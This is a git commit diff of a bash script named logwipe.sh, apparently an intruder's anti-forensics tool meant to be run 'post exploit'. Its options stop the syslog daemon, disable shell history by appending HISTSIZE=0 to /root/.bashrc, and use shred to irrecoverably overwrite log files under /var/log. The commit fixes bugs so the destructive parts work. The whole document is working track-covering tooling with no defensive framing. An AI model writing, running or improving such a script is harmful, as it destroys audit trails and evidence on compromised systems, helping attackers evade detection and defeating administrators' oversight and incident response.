7f55ef5ea29997f84b09c6a29e6a971cdf16b772
root <root@localhost.localdomain>
2017-10-20 12:31:53 +1100

    Working

--- logwipe.sh
+++ logwipe.sh
@@ -1,34 +1,41 @@
 #!/bin/bash
 
+# Set colors
+red=$(tput setaf 1)
+green=$(tput setaf 2)
+reset=$(tput sgr0)
+
 # Script for wiping log files
-while `getopts ":hsHl" arg`;
+while getopts ":hsHl" arg;
 	do
         case "${arg}" in
                 # Take out remote logging
-                s)
+                s )
                   SYSLOGINIT=`/usr/bin/find /etc/init.d -name *syslog*`
                   /bin/bash $SYSLOGINIT stop
-                  echo "{tput setaf 2}Syslog daemon Stopped{tput sgr0}"
+                  echo "$green Syslog daemon Stopped $reset"
                 ;;
                 # Sort out history
-                H)
-                  /usr/bin/shred -zu /root/.bash_history
-                  export HISTSIZE=0
-                  echo "History stopped and wiped"
+                H )
+                  export HISTSIZE="0"
+		  echo HISTSIZE=0>>/root/.bashrc
+                  echo "$green History stopped and wiped $reset"
                 ;;
                 # Take out the recent log files if run post exploit otherwise leave
-                l)
-                  for log in `/usr/bin/find /var/log -name *log$*`; do `shred -zu $log`
-                  echo "{tput setaf 2}Recent logs wiped{tput sgr0}"
+                l )
+                  for log in `/usr/bin/find /var/log -name *log$*`; do 
+			  shred -zu $log
+			  done
+                  echo "$green Recent logs wiped $reset"
                 ;;
 		# usage info
-                *)
+                * )
                   echo "Usage: logwipe.sh -hsHl"
                   echo "-h - This help message"
                   echo "-s - Shut down syslog daemon"
                   echo "-H - Wipe history and stop history function"
                   echo "-l - Wipe recent log files"
-				  exit 0
+		  exit 0
                 ;;
         	esac
 	done
